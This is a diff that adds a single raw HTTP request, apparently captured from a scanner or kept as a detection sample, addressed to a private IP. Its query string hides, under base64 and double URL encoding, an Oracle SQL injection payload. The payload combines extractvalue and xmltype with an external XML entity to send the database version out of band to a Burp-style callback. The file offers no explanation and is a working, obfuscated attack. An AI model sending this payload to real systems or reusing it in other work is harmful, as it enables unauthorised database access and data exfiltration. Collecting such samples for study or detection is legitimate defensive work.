@@ -1,0 +1,11 @@
+GET /?JTI1MjhzZWxlY3QlMjUyMGV4dHJhY3R2YWx1ZSUyNTI4eG1sdHlwZSUyNTI4JTI1MjclMjUzQyUyNTNGeG1sJTI1MjB2ZXJzaW9uJTI1M0QlMjUyMjEuMCUyNTIyJTI1MjBlbmNvZGluZyUyNTNEJTI1MjJVVEYtOCUyNTIyJTI1M0YlMjUzRSUyNTNDJTI1MjFET0NUWVBFJTI1MjByb290JTI1MjAlMjU1QiUyNTIwJTI1M0MlMjUyMUVOVElUWSUyNTIwJTI1MjUlMjUyMHZhcG90JTI1MjBTWVNURU0lMjUyMCUyNTIyJTI1MjclMjU3QyUyNTdDJTI1MjhzZWxlY3QlMjUyMHZlcnNpb24lMjUyMGZyb20lMjUyMHYlMjUyNGluc3RhbmNlJTI1MjklMjU3QyUyNTdDJTI1MjdCdXJwJTI1MkYlMjUyMiUyNTNFJTI1MjV2YXBvdCUyNTNCJTI1NUQlMjUzRSUyNTI3JTI1MjklMjUyQyUyNTI3JTI1MkZsJTI1MjclMjUyOSUyNTIwZnJvbSUyNTIwZHVhbCUyNTI5 HTTP/1.1
+Host: 10.10.3.128:2280
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+
